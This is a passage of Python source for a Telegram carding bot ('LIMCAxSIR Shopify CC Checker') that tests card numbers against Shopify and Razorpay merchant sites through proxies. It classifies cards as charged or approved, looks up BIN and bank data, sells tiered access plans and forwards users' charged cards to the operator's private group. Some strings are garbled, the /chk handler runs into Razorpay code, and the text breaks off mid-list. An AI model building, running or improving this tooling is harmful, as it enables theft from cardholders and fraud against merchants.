        f"👤 <b>User</b>       : <code>{user_id}</code> (@{username})\n"
        f"💎 <b>Plan</b>       : {plan_name}\n"
        f"🔧 <b>Check Type</b> : {check_type}\n"
        f"⏳ <b>Time</b>       : {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛒 <b>Gateway</b>    : {result.get('gateway', 'Unknown')}\n"
        f"📝 <b>Response</b>   : {result['message']}\n"
        f"💸 <b>Price</b>      : {result.get('price', '-')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    try:
        await bot.send_message(
            HIT_LOG_CHANNEL,
            premium_emoji(log_msg),
            parse_mode="html"
        )
    except Exception as e:
        print("LOG ERROR:", e)

# ====================== FORWARD TO PRIVATE GROUP ======================
async def forward_to_private_group(result, user_id, username, check_type="Check"):
    """Forward charged/insufficient cards to admin's private group with full details."""
    if not PRIVATE_FORWARD_GROUP:
        return
    try:
        card = result.get('card', 'Unknown')
        message = result.get('message', 'Unknown')
        gateway = result.get('gateway', 'Unknown')
        price = result.get('price', '-')
        status = result.get('status', 'Unknown')
        site = result.get('site', '-')

        # Get BIN info
        try:
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        except Exception:
            brand, bin_type, level, bank, country, flag = 'Unknown', '-', '-', 'Unknown', 'Unknown', ''

        # Get user plan
        try:
            if user_id in ADMIN_ID:
                plan_name = "OWNER"
            else:
                users = load_users_data()
                plan_key = users.get(str(user_id), {}).get("plan", "FREE")
                plan_name = plan_key
        except Exception:
            plan_name = "Unknown"

        # Determine emoji based on status
        if status == 'Charged':
            emoji = "💎"
            header = "CHARGED CARD"
        elif 'insufficient' in message.lower():
            emoji = "⚠️"
            header = "INSUFFICIENT FUNDS"
        else:
            emoji = "🎯"
            header = "HIT"

        fwd_msg = (
            f"{emoji} <b>{header} — USER HIT</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💳 <b>Card</b>      : <code>{card}</code>\n"
            f"🏷️ <b>Status</b>    : {status}\n"
            f"🛒 <b>Gateway</b>   : {gateway}\n"
            f"📝 <b>Response</b>  : {message}\n"
            f"💰 <b>Price</b>     : {price}\n"
        )
        if site and site != '-':
            fwd_msg += f"🌐 <b>Site</b>      : {site}\n"
        fwd_msg += (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>User</b>      : <code>{user_id}</code> (@{username})\n"
            f"🎟️ <b>Plan</b>      : {plan_name}\n"
            f"🔧 <b>Check Type</b>: {check_type}\n"
            f"⏰ <b>Time</b>      : {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🏷️ <b>BIN Info</b>\n"
            f"   {brand} · {bin_type} · {level}\n"
            f"   🏦 {bank}\n"
            f"   🌍 {country} {flag}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Forwarded by LIMCAxSIR Bot"
        )

        await bot.send_message(
            PRIVATE_FORWARD_GROUP,
            premium_emoji(fwd_msg),
            parse_mode="html"
        )
    except Exception as e:
        print("PRIVATE FORWARD ERROR:", e)

async def log_redeem_to_channel(user_id, username, plan_key, redeem_code):
    try:
        if user_id in ADMIN_ID:
            plan_name = "👑 OWNER"
        else:
            plan_name = f"{PLANS.get(plan_key, {}).get('emoji', '💎')} {plan_key}"

        msg = (
            f"🎉 <b>NEW PLAN REDEEMED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>User</b> : @{username}\n"
            f"🆔 <b>User ID</b> : <code>{user_id}</code>\n"
            f"💎 <b>Plan</b> : {plan_name}\n"
            f"🔑 <b>Redeem Code</b> : <code>{redeem_code}</code>\n"
            f"⏳ <b>Time</b> : {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )

        await bot.send_message(
            HIT_LOG_CHANNEL,
            premium_emoji(msg),
            parse_mode="html"
        )

    except Exception as e:
        print("Redeem Log Error:", e)

# ====================== PROGRESS & RESULTS ======================
async def update_progress(chat_id, user_id, message_id, results, current_attempt_count):
    total = results.get('total', 0)
    checked = len(results['charged']) + len(results['approved']) + len(results['dead'])
    last_card = results.get('last_card', 'Waiting...')
    last_price = results.get('last_price', '-')
    last_response = results.get('last_response', 'Waiting...')
    progress_text = (
        f"🔄 <b>Checking Progress...</b>\n\n"
        f"💳 <b>Card</b>     » <code>{last_card}</code>\n"
        f"📝 <b>Response</b> » {last_response}\n"
        f"💰 <b>Price</b>    » {last_price}\n\n"
        f"✅ <b>Charged</b>  » {len(results['charged'])}\n"
        f"🔥 <b>Approved</b> » {len(results['approved'])}\n"
        f"❌ <b>Declined</b> » {len(results['dead'])}\n"
        f"📊 <b>Progress</b> » {checked}/{total}\n\n"
        f"⚡ Powered by LIMCAxSIR"
    )
    buttons = [[Button.inline("STOP", f"stop_{user_id}".encode())]]
    try:
        await bot.edit_message(
            chat_id,
            message_id,
            premium_emoji(progress_text),
            buttons=buttons,
            parse_mode='html'
        )

    except FloodWaitError as e:
        print(f"FloodWait: {e.seconds} seconds")
        return

    except Exception as e:
        print(f"Progress update error: {e}")
        return

async def send_final_results(chat_id, results):
    charged_count = len(results['charged'])
    approved_count = len(results['approved'])
    dead_count = len(results['dead'])
    total = results.get('total', charged_count + approved_count + dead_count)
    hits_lines = []
    for r in results['charged'][:5]:
        hits_lines.append(f"💎 <code>{r['card']}</code>  {r.get('gateway','?')}  {r.get('price','-')}")
    for r in results['approved'][:5]:
        hits_lines.append(f"✅ <code>{r['card']}</code>  {r.get('gateway','?')}  {r.get('price','-')}")
    hits_text = "\n".join(hits_lines) if hits_lines else "  No hits this run."
    summary = (
        f"<b>✅ LIMCAxSIR • CHECK COMPLETE</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>RESULTS</b>\n"
        f"   💎 Charged  : {charged_count}\n"
        f"   ✅ Approved : {approved_count}\n"
        f"   ❌ Declined : {dead_count}\n"
        f"   📦 Total    : {total}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 <b>HITS</b>\n"
        f"{hits_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Made by LIMCAxSIR & LIMCAxSIR"
    )
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"LIMCAxSIR{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        await f.write("=" * 40 + "\n\n")
        for r in results['charged']:
            await f.write(f"CHARGED: {r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        for r in results['approved']:
            await f.write(f"APPROVED: {r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        for r in results['dead']:
            await f.write(f"DECLINED: {r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
    await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode='html')
    try:
        os.remove(filename)
    except Exception:
        pass

async def send_realtime_hit(chat_id, result, hit_type, username):
    if hit_type == "Charged":
        header = "💎 ⚜ LIMCAxSIR • CHARGED"
    else:
        header = "✅ ⚜ LIMCAxSIR • APPROVED"
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    message = (
        f"<b>{header}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{result['card']}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🛒 <b>Gateway</b>  {result.get('gateway', 'Unknown')}\n"
        f"📝 <b>Response</b> {result['message']}\n"
        f"💸 <b>Price</b>    {result.get('price', '-')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 {brand} · {bin_type} · {level}\n"
        f"🏦 {bank}\n"
        f"🌍 {country} {flag}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    try:
        msg_obj = await bot.send_message(chat_id, premium_emoji(message), parse_mode='html')
        if hit_type == "Charged":
            await bot.pin_message(chat_id, msg_obj)
    except Exception:
        pass

# ====================== SITE / PROXY TESTING ======================
async def test_site(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, user, pw = parts
                proxy_str = f"{ip}:{port}:{user}:{pw}"
            elif len(parts) == 2:
                proxy_str = f"{parts[0]}:{parts[1]}"
            else:
                 proxy

        # Updated API format for site testing
        url = f'{CHECKER_API_URL}?site={quote_plus(site)}&cc={quote_plus(test_card)}'
        if proxy_str:
            url += f'&proxy={quote_plus(proxy_str)}'

        timeout = aiohttp.ClientTimeout(total=60)
        session = _shared_http_session()
        # REMOVED fix #5: print("REQUEST URL:", url)
        async with session.get(url) as resp:
            if resp.status != 200:
                return {'site': site, 'status': 'dead'}
            try:
                raw = await resp.json()
            except Exception:
                return {'site': site, 'status': 'dead'}
        response_msg = raw.get('Response', '')
        if not response_msg:
            return {'site': site, 'status': 'dead', 'price': '-'}
        raw_price = raw.get('Price', '-')
        return {'site': site, 'status': 'alive', 'price': raw_price}
    except Exception:
        return {'site': site, 'status': 'dead', 'price': '-'}

# ====================== FIXED PROXY TESTING ======================
async def test_proxy(proxy: str):
    """
    Tests a single proxy by attempting to connect to a reliable endpoint (api.ipify.org).
    Returns {'proxy': proxy, 'status': 'alive'} or {'proxy': proxy, 'status': 'dead'}.
    """
    try:
        # Format the proxy URL correctly for aiohttp
        # Supports formats: ip:port, user:pass@ip:port, ip:port:user:pass
        proxy_url = None
        if ':' in proxy:
            parts = proxy.split(':')
            if len(parts) == 4:
                # Format: ip:port:user:pass
                ip, port, user, password = parts
                proxy_url = f'http://{user}:{password}@{ip}:{port}'
            elif len(parts) == 2:
                # Format: ip:port
                ip, port = parts
                proxy_url = f'http://{ip}:{port}'
            else:
                # Fallback: assume it's already a valid proxy URL
                proxy_url = proxy

        if not proxy_url:
            return {'proxy': proxy, 'status': 'dead'}

        timeout = aiohttp.ClientTimeout(total=10)
        session = _shared_http_session()
        async with session.get('https://api.ipify.org?format=json', proxy=proxy_url) as response:
            if response.status == 200:
                return {'proxy': proxy, 'status': 'alive'}
            else:
                return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

# ====================== BOT HANDLERS ======================

# ====================== FORCE JOIN VERIFICATION ======================
@bot.on(events.CallbackQuery(data=b"verify_joined"))
async def verify_joined_callback(event):

    user_id = event.sender_id

    mark_user_verified(user_id)

    await event.answer(
        "✅ Verification Successful",
        alert=True
    )

    assign_free_plan(user_id)

    await start(event)

    # List of channels to check (name, link)
    channels = [
        ("LOGS", LOGS_CHANNEL),
        ("CHECKING", CHECKING_CHANNEL),
        ("UPDATES", UPDATES_CHANNEL),
        ("PVT LIMCA", PVT_LIMCA_CHANNEL),
    ]
    not_joined = []
    for name, link in channels:
        try:
            # Extract channel entity from link
            if link.startswith('https://t.me/+-'):
                # Private channel with hash - skip checking
                continue
            elif link.startswith('https://t.me/+'):
                # Private channel with invite link - skip checking
                continue
            else:
                # Public channel - get entity by username
                username = link.replace('https://t.me/', '').strip()
                if username:
                    entity = await bot.get_entity(username)
                    await bot(GetParticipantRequest(entity, user_id))
        except UserNotParticipantError:
            not_joined.append(name)
        except Exception as e:
            print(f"[Channel Verification] {name} failed: {str(e)[:100]}")
            not_joined.append(name)

    if not_joined:
        await event.answer(f"❌ Please join all channels first!\nMissing: {', '.join(not_joined)}", alert=True)
        return

    mark_user_verified(user_id)
    await event.answer("✅ Verification successful! Welcome.", alert=True)

    try:
        await event.delete()
    except Exception:
        pass

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except Exception:
        username = "User"

    assign_free_plan(user_id)
    welcome_text = (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Verification Successful</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>⚜ LIMCAxSIR\n"
f"Private Member Network</b>\n"
        f"⚡ Your access has been unlocked!\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Made by <b>LIMCAxSIR</b> & <b>LIMCAxSIR</b>"
    )
    buttons = get_main_menu_keyboard(user_id, is_free=False)
    await event.respond(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

# ====================== START COMMAND ======================
@bot.on(events.NewMessage(pattern=r'^/start(?:\s|$)'))
async def start(event):
    user_id = event.sender_id
    try:
        await bot.get_entity(user_id)
    except:
        pass
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except Exception:
        username = "User"

    if not is_user_verified(user_id) and user_id not in ADMIN_ID:
        join_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ <b>⚜ LIMCAxSIR\n"
f"Private Member Network</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔒 <b>Access Restricted</b>\n\n"
            f"Please join all the following channels to continue:\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        buttons = [
    [
        Button.url("LOGS", LOGS_CHANNEL),
        Button.url("CHECKING", CHECKING_CHANNEL)
    ],
    [
        Button.url("UPDATES", UPDATES_CHANNEL),
        Button.url("PVT LIMCA", PVT_LIMCA_CHANNEL)
    ],
    [
        Button.inline("JOINED", b"verify_joined")
    ]
]
        await event.reply(premium_emoji(join_text), buttons=buttons, parse_mode='html')
        return

    assign_free_plan(user_id)
    users_data = load_users_data()
    uid = str(user_id)
    user_data = users_data.get(uid)
    is_free_user = (user_data and user_data.get('plan') == 'FREE') and user_id not in ADMIN_ID

    if is_free_user:
        cc_limit = user_data.get('cc_limit', 100)
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Welcome, @{username}!\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"\xf0\x9f\x86\x93 <b>Free Plan Activated!</b>\\n"
            f"  \xf0\x9f\x93\x8a Limit Per Run: {cc_limit} CC checks\\n"
            f"  \xf0\x9f\x94\x84 Remaining Checks: Unlimited\\n"
            f"  \xf0\x9f\x8f\xa0 Group-only checking\\n\\n"
            f"👇 <b>Join our group to start checking:</b>\n"
            f"  {GROUP_LINK}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Want more? Use /plan to upgrade\n"
            f"💡 Made by <b>LIMCAxSIR</b> & <b>LIMCAxSIR</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=True)
    else:
        welcome_text = (
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Welcome, @{username}!\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 <b>LIMCAxSIR – Shopify CC Checker</b>\n"
            f"  Fast  ·  Accurate  ·  Premium\n\n"
            f"📌 <b>Quick Start:</b>\n"
            f"  💳 <code>/cc 4111...|12|26|123</code>\n"
            f"  📂 <code>/chk</code>  — reply to .txt for mass check\n"
            f"  🔌 <code>/addproxy</code>  — add your proxies\n"
            f"  🌐 <code>/addsite</code>  — add a single site\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Made by <b>LIMCAxSIR</b> & <b>LIMCAxSIR</b>"
        )
        buttons = get_main_menu_keyboard(user_id, is_free=False)

    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

# ====================== COMMANDS ======================
# ====================== BROADCAST SYSTEM ======================

@bot.on(events.NewMessage(pattern=r'^/broadcast$'))
async def broadcast_command(event):

    if event.sender_id not in ADMIN_ID:
        return await event.reply(
            premium_emoji("❌ <b>Access Denied</b>\nAdmin only."),
            parse_mode="html"
        )

    if not event.is_reply:
        return await event.reply(
            premium_emoji(
                "📢 <b>Broadcast Usage</b>\n\n"
                "Reply to any message and send:\n"
                "<code>/broadcast</code>"
            ),
            parse_mode="html"
        )

    reply_msg = await event.get_reply_message()

    users = load_users_data()

    if not users:
        return await event.reply(
            premium_emoji("❌ No users found in database."),
            parse_mode="html"
        )

    total_users = len(users)

    status = await event.reply(
        premium_emoji(
            f"📡 <b>Broadcast Started</b>\n\n"
            f"👥 Total Users: <code>{total_users}</code>\n"
            f"⏳ Status: Running..."
        ),
        parse_mode="html"
    )

    sent = 0
    failed = 0

    for uid in list(users.keys()):

        try:
            uid = int(uid)

            entity = await bot.get_entity(uid)

            if reply_msg.media:
                await bot.send_file(
                    entity,
                    file=reply_msg.media,
                    caption=reply_msg.text or "",
                    parse_mode="html"
                )
            else:
                await bot.send_message(
                    entity,
                    reply_msg.message,
                    parse_mode="html"
                )

            sent += 1

            if sent % 25 == 0:
                try:
                    await status.edit(
                        premium_emoji(
                            f"📡 <b>Broadcast Running</b>\n\n"
                            f"👥 Total: <code>{total_users}</code>\n"
                            f"✅ Sent: <code>{sent}</code>\n"
                            f"❌ Failed: <code>{failed}</code>"
                        ),
                        parse_mode="html"
                    )
                except:
                    pass

            await asyncio.sleep(0.05)

        except FloodWaitError as e:
            print(f"[FLOODWAIT] Waiting {e.seconds} seconds")
            await asyncio.sleep(e.seconds)

        except Exception as e:
            failed += 1
            print(f"[BROADCAST FAILED] User: {uid} | Error: {e}")

    await status.edit(
        premium_emoji(
            "✅ <b>Broadcast Completed</b>\n\n"
            f"👥 Total Users : <code>{total_users}</code>\n"
            f"📨 Delivered   : <code>{sent}</code>\n"
            f"❌ Failed      : <code>{failed}</code>\n\n"
            "🚀 Broadcast finished successfully."
        ),
        parse_mode="html"
    )
@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = (
        "📋 <b>⚜ LIMCAxSIR Command Center</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🛒 <b>Shopify Gate</b>\n"
        "  <code>/cc 4111|12|26|123</code>  — single card\n"
        "  <code>/chk</code>  — reply to .txt → mass check\n\n"
        "💳 <b>Razorpay Gate</b>  <i>(🥇 PREMIUM / 👑 VIP only)</i>\n"
        "  <code>/rz 4111|12|26|123</code>  — single card\n"
        "  <code>/mrz</code>  — reply to .txt → mass check\n\n"
        "💎 <b>Plans & Access</b>\n"
        "  <code>/plan</code>    — view available plans\n"
        "  <code>/redeem CODE</code> — activate a code\n"
        "  <code>/myplan</code>  — check your plan status\n\n"
        "💬 <b>Feedback</b>\n"
        "  <code>/fb</code>  — reply to any text/photo/document to send feedback\n\n"
        "🌐 <b>Site Management</b>\n"
        "  <code>/addsite url</code> — add a single site\n"
        "  <code>/addsites</code> — reply to .txt to add multiple\n"
        "  <code>/site</code>  — remove dead sites\n"
        "  <code>/rm site.com</code>  — remove one site\n\n"
        "🔌 <b>Proxy Management</b>\n"
        "  <code>/addproxy ip:port:u:p</code>  — add proxy\n"
        "  <code>/proxy</code>  — clean dead proxies\n"
        "  <code>/getproxy</code>  — view all proxies\n"
        "  <code>/chkproxy ip:port</code>  — test one proxy\n"
        "  <code>/rmproxy ip:port</code>  — remove one proxy\n"
        "  <code>/rmproxyindex 1,3,5</code>  — remove by #\n"
        "  <code>/clearproxy</code>  — wipe all (saves backup)\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    buttons = [[Button.inline("Back", b"main_menu")]]
    await safe_edit(event, premium_emoji(commands_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("❌ Access Denied. Admin only.", alert=True)
        return
    current_rz_url = load_rz_merchant_url()
    admin_text = (
        "👑 <b>⚜ LIMCAxSIR Control Center</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎟️ <b>Generate Redeem Code</b>\n"
        "Select a plan to instantly generate a code:\n\n"
        "🌐 <b>Sites Management</b>\n"
        "  <code>/addsite url</code> — add single\n"
        "  <code>/addsites</code>  — reply to .txt to add sites\n"
        "  <code>/getsites</code>  — download sites.txt\n\n"
        "🏦 <b>Razorpay Settings</b>\n"
        f"  Current URL: <code>{current_rz_url}</code>\n"
        "  <code>/setrzurl razorpay.me/@user</code> — update merchant URL\n\n"
        "📊 <b>⚜ LIMCAxSIR Command Center</b>\n"
        "  <code>/listusers</code> — active premium users\n"
        "  <code>/stats</code>     — bot stats\n"
        "  <code>/listcodes</code> — all generated codes"
    )
    buttons = [
        [Button.inline("FREE",     b"gencode_FREE"),
         Button.inline("BASIC",    b"gencode_BASIC")],
        [Button.inline("STANDARD", b"gencode_STANDARD"),
         Button.inline("PREMIUM",  b"gencode_PREMIUM")],
        [Button.inline("VIP",      b"gencode_VIP")],
        [Button.inline("Back", b"main_menu")],
    ]
    await safe_edit(event, premium_emoji(admin_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    await start(event)

# ====================== /addsite ======================
@bot.on(events.NewMessage(pattern=r'^/addsite\s+'))
async def addsite_command(event):
    user_id = event.sender_id
    if event.sender_id not in ADMIN_ID:
        return await event.reply("❌ Admin only command")

    parts = event.message.text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/addsite https://example.myshopify.com</code>"), parse_mode='html')
        return

    site = parts[1].strip()
    if not site.startswith('http'):
        site = f'https://{site}'

    current_sites = load_sites()
    if site in current_sites:
        await event.reply(premium_emoji("⚠️ Site already exists in the list."), parse_mode='html')
        return

    current_sites.append(site)
    save_sites(current_sites)
    await event.reply(premium_emoji(f"✅ Site added successfully!\n\n🌐 <code>{site}</code>\n📦 Total sites: {len(current_sites)}"), parse_mode='html')

# ====================== /cc (SINGLE CARD SHOPIFY) ======================
@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def cc_single_command(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    check_status = can_check(user_id, event.is_private)
    if check_status == 'no_plan':
        await event.reply(premium_emoji(
            "❌ <b>No Plan Found</b>\n\nUse /plan to see plans\nUse /redeem CODE to activate"
        ), parse_mode='html')
        return
    if check_status == 'expired':
        await event.reply(premium_emoji("⏰ <b>Plan Expired</b>\n\nUse /plan to purchase."), parse_mode='html')
        return
    if check_status == 'group_only':
        await event.reply(premium_emoji(
            f"🆓 <b>Free Plan — Group Only</b>\n\nJoin our group to check cards:\n{GROUP_LINK}"
        ), buttons=[[Button.url("🏠 Join Group", GROUP_LINK)]], parse_mode='html')
        return

    

    sites = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Use /addsite to add sites."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Use /addproxy to add proxies."), parse_mode='html')
        return

    cc_input = event.message.text.split(None, 1)[1].strip() if len(event.message.text.split(None, 1)) > 1 else ''
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji(
            "❌ <b>Invalid Format</b>\n\n"
            "Usage: <code>/cc card|mm|yy|cvv</code>\n"
            "Example: <code>/cc 4111111111111111|12|26|123</code>"
        ), parse_mode='html')
        return

    card = cards[0]
    loading_text = (
        f"⏳ 𝗜𝗦 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 . . . .\n\n"
        f"💳 Card » <code>{card}</code>\n"
        f"🌐 Gateway » 𝙎𝙝𝙤𝙥𝙞𝙛𝙮\n"
        f"🔍 Status » 𝙇𝙤𝙖𝙙𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚...\n\n"
        f"⚡ Powered by @CB_GOD_LIMCA & LIMCAxSIR"
    )
    status_msg = await event.reply(premium_emoji(loading_text), parse_mode='html')

    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=2)
        increment_cc_used(user_id, 1)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_header = "💎 𝑪𝑯𝑨𝑹𝑮𝑬𝑫"
            await log_hit_to_channel(result, 'Charged', user_id, username, check_type="Single CC Check")
            await forward_to_private_group(result, user_id, username, "Single Shopify Check")
            try:
                await bot.pin_message(event.chat_id, status_msg)
            except Exception:
                pass
        elif result['status'] == 'Approved':
            status_header = "✅ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫"
            await log_hit_to_channel(result, 'Approved', user_id, username, check_type="Single CC Check")
        else:
            status_header = "❌ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫"

        resp_text = (
            f"{status_header}\n\n"
            f"💳 CC <code>{result['card']}</code>\n\n"
            f"🛒 Gateway {result.get('gateway', 'Shopify')}\n"
            f"📝 Response {result['message']}\n"
            f"💸 Price {result.get('price', '-')}\n\n"
            f"🆔 BIN Info {brand} - {bin_type} - {level}\n"
            f"🏦 Bank {bank}\n"
            f"🥰 Country {country} {flag}\n\n"
            f"💡 Made by LIMCAxSIR & LIMCAxSIR"
        )
        await safe_edit(status_msg, premium_emoji(resp_text), parse_mode='html')

    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ====================== /chk ======================
@bot.on(events.NewMessage(pattern=r'^/chk(?:\s|$)'))
async def check_command(event):
    user_id = event.sender_id
    chat_id = event.chat_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"

    if not is_premium(user_id):
        await event.reply(premium_emoji(
            "❌ <b>Access Denied</b>\n\nYou need a plan to use this bot.\n"
            "💡 Use /plan to see available plans\n"
            "💡 Use /redeem CODE to activate"
        ), parse_mode='html')
        return

    check_status = can_check(user_id, event.is_private)
    if check_status != 'ok':
        await event.reply(premium_emoji(f"❌ Access not allowed. Status: {check_status}"), parse_mode='html')
        return

    if user_id in user_active_check:
        current = user_active_check[user_id]
        session_type = "🛒 Shopify" if current['type'] == 'chk' else "💳 Razorpay"
        await event.reply(premium_emoji(
            f"🚫 <b>Already Running!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"⚡ <b>Active Session:</b>  {session_type}\n\n"
            f"You already have a check running.\n"
            f"Wait for it to finish, then start a new one.\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Use STOP button to cancel the current check."
        ), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(premium_emoji("❌ No sites available. Use /addsite to add sites."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies available. Use /addproxy to add proxies."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')
    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)
    if not cards:
        await safe_edit(status_msg,premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return

    if len(cards) > 5000:
        cards = cards[:5000]


    if user_id not in ADMIN_ID:
        users_data_rz = load_users_data()
        user_plan_rz = users_data_rz.get(str(user_id), {}).get('plan', 'FREE')
        plan_data_rz = PLANS.get(user_plan_rz, PLANS['FREE'])

        SESSION_LIMIT_RZ = plan_data_rz['cc_limit'] if user_plan_rz != 'FREE' else 100

        if len(cards) > SESSION_LIMIT_RZ:
            total_input = len(cards)
            cards = cards[:SESSION_LIMIT_RZ]
            plan_emoji = plan_data_rz.get('emoji', '💎')
            await safe_edit(status_msg, premium_emoji(
                f"{plan_emoji} <b>{user_plan_rz} Plan</b> — checking first <b>{SESSION_LIMIT_RZ}</b> of {total_input} cards\n"
                f"💡 This is your per-session limit. You can check again after this run."
            ), parse_mode='html')
            await asyncio.sleep(1)

    os.remove(file_path)

    total_cards = len(cards)
    await safe_edit(status_msg, premium_emoji(f"🔥 Starting Razorpay check for <b>{total_cards}</b> cards...\n💰 Amount: <b>{rz_amt} {rz_cur}</b>"), parse_mode='html')

    session_key = f"rz_{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    user_active_check[user_id] = {
        'type': 'mrz',
        'session_key': session_key,
        'chat_id': chat_id,
        'msg_id': status_msg.id
    }

    all_results = {
        'charged': [], 'approved': [], 'dead': [],
        'total': total_cards, 'checked': 0,
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Razorpay',
    }

    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update_time = [time.time()]

        async def rz_worker():
            while not queue.empty() and session_key in active_sessions:
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break

                if not proxies:
                    break

                res = await check_razorpay_with_retry(card, proxies, max_retries=3, amount=rz_amt, currency=rz_cur)

                all_results['checked'] += 1
                all_results['last_card'] = card
                all_results['last_response'] = res.get('message', '')
                all_results['last_price'] = res.get('price', '₹1')

                if res['status'] == 'Charged':
                    # Add comprehensive payment success messages including Shopify standard ones
                    payment_messages = [
                        # User requested messages
                        'Order_Placed', 'order_placed',
                        'Payment_Successful', 'payment_successful',
                        'Thank_You', 'thank_you', 'Thank You',
                        'Order Completed 💎', 'order completed 💎',
